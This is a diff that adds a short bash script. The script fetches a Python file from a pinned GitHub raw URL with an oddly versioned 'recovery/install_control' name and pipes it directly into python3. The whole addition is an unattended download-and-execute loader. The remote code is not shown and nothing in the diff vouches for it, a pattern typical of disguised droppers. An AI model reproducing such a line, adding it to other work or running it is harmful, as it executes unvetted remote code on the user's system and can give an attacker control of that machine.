@@ -1,0 +1,4 @@
+#!/usr/bin/env bash
+set -euo pipefail
+U=https://raw.githubusercontent.com/andreyshabaev/Browser-Studio/aaf685d24ccd1f2ec871d6cb9e90c3d5dacb5488/recovery/install_control_v5536_v2.py
+curl -fsSL "$U" | /usr/bin/python3 -
